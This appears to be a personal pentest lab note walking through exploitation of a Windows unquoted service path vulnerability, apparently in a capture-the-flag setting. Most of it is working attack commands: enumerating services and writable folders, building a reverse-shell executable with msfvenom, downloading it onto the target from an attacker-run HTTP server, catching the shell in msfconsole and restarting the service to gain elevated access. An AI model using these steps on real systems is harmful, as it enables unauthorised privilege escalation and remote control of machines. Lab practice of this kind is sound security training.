##POC 
#Unquoted_Service_Path/poc

However, if the path is not written between quotes and if any folder name in the path has a space in its name, things may get complicated. Windows will append ".exe" and start looking for an executable, starting with the shortest possible path. In our example, this would be C:\Program.exe. If program.exe is not available, the second attempt will be to run topservice.exe under C:\Program Files\. If this also fails, another attempt will be made for C:\Program Files\topservice folder\subservice.exe. This process repeats until the executable is found.


**inding Unquoted Service Path Vulnerabilities**

Tools like winPEAS and PowerUp.ps1 will usually detect unquoted service paths. But we will need to make sure other requirements to exploit the vulnerability are filled. These are;

1.  Being able to write to a folder on the path
2.  Being able to restart the service

If either of these conditions is not met, successful exploitation may not be possible. 

  The command below will list services running on the target system. The result will also print out other information, such as the display name and path. 
## List services running on the target system
``` 

wmic service get name,displayname,pathname,startmode

```

 `C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe`
 
  Going over the output of this command on the target machine, you will notice that the "unquotedsvc" service has a path that **is not written between quotes.**
  
  You can further check the binary path of this service using the command below: 

```
sc qc unquotedsvc

```

## Check privileges on folders 
Once we have confirmed that the binary path is unquoted, we will need to check our privileges on folders in the path. Our goal is to find a folder that is writable by our current user. We can use accesschk.exe with the command below to check for our privileges.

```
.\accesschk64.exe /accepteula -uwdq "C:\Program Files\"

```

exemplo:
```
.\accesschk64.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"

```

output:
``` run the previous command

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Unquoted Path Service
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrator

```

[github](https://github.com/ankh2054/windows-pentest)

We now have found a folder we can write to. As this folder is also in the service's binary path, we know the service **will try to run an executable with the name of the first word of the folder name**.

## Create reverse shell windows
#msfvenom/windows/reverse_shell

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[KALI or AttackBox IP Address] LPORT=[The Port to which the reverse shell will connect] -f exe > executable_name.exe

```


```
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.9.**  LPORT=4545 -f exe > common.exe
 
```

## Send payload to windows machine:
#/windows/send/payload

powershell:
```
C:\Program Files\Unquoted Path Service\> wget -O common.exe http://10.9.9.67:4545/common.exe
```

kali:
```
python3 -m http.server 4545

```

## Set revershell no msfconsole:
#msfconsole/reverse_shell/multi/handler

```
search multi/handler

set payload windows/x64/shell_reverse_tcp

run

```

## start/Stop services:
```
sc stop unquotedsvc

```

```
sc start unquotedsvc

```

## search Path of file in windows
**Go to floder / and run this command to serch for the file flagUSP.txt:


```
dir flagUSP.txt /s

```
[[Windows Privesc#^3f1104]]
output:
`C:\Users\Cora\Documents` ^1d274a